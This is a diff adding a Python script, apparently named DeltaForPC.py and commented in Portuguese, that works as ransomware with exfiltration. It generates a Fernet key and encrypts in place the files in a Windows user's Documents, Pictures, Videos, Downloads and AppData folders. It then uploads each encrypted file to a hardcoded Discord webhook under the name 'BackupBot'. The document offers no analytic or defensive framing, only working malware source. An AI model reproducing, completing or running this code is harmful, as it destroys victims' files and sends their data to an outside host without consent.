@@ -1,0 +1,60 @@
+import os
+from cryptography.fernet import Fernet
+import requests
+
+WEBHOOK_URL = "https://discord.com/api/webhooks/1410390008157966539/iDGhsgcNcgELyDqqeORPxcuJNyqpNJuf40kd3uQVqk5uubz6doj4XjJHpZeSgOVkc5yD"
+
+def enviar_arquivo_webhook(caminho_arquivo):
+    with open(caminho_arquivo, "rb") as f:
+        nome_arquivo = os.path.basename(caminho_arquivo)
+        payload = {
+            "content": f"Arquivo criptografado: {nome_arquivo}",
+            "username": "BackupBot"
+        }
+        files = {
+            "file": (nome_arquivo, f)
+        }
+        response = requests.post(WEBHOOK_URL, data=payload, files=files)
+        if response.status_code == 204:
+            print(f"Enviado com sucesso: {nome_arquivo}")
+        else:
+            print(f"Falha ao enviar {nome_arquivo}: {response.status_code} - {response.text}")
+
+# arquivos abaixo
+key = Fernet.generate_key()
+with open("chave.key", "wb") as chave:
+    chave.write(key)
+
+username = os.getenv("USERNAME")
+folders = [
+    os.path.join(r"C:\Users", username, "Documents"),
+    os.path.join(r"C:\Users", username, "Pictures"),
+    os.path.join(r"C:\Users", username, "Videos"),
+    os.path.join(r"C:\Users", username, "Downloads"),
+    os.path.join(r"C:\Users", username, "AppData", "Local"),
+    os.path.join(r"C:\Users", username, "AppData", "Roaming"),
+]
+
+arquivos = []
+
+for folder in folders:
+    for root, dirs, files in os.walk(folder):
+        for file in files:
+            if file in ["DeltaForPC.py", "chave.key", "desktop.ini"]:
+                continue
+            file_path = os.path.join(root, file)
+            arquivos.append(file_path)
+
+for arquivo in arquivos:
+    with open(arquivo, "rb") as file:
+        conteudo = file.read()
+
+    conteudo_criptografado = Fernet(key).encrypt(conteudo)
+
+    with open(arquivo, "wb") as file:
+        file.write(conteudo_criptografado)
+
+    # Aqui: envia o arquivo criptografado para o Discord via webhook
+    enviar_arquivo_webhook(arquivo)
+
+print(conteudo)
